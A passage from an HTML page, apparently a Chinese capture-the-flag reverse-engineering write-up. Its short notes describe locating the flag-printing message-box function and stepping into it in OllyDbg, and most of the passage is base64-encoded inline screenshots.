+2g02mBExz4ajTYY0bGPRqMNRv8P3twiPd82bG4AAAAASUVORK5CYII='/></p>
<p>发现输出flag的消息窗函数在该程序里面有两个，推断之前运行程序弹出的乱码是其中一个，猜测另一个是对的，拉进od调试一下看看</p>
<p><img src='data:img/jpg;base64,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'/></p>
<p>发现运行完这个函数便会出现弹窗，而在此之前什么关键信息都没找到，关键函数应该就在这里，步入查看</p>
<p><img src='data:img/jpg;base64,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
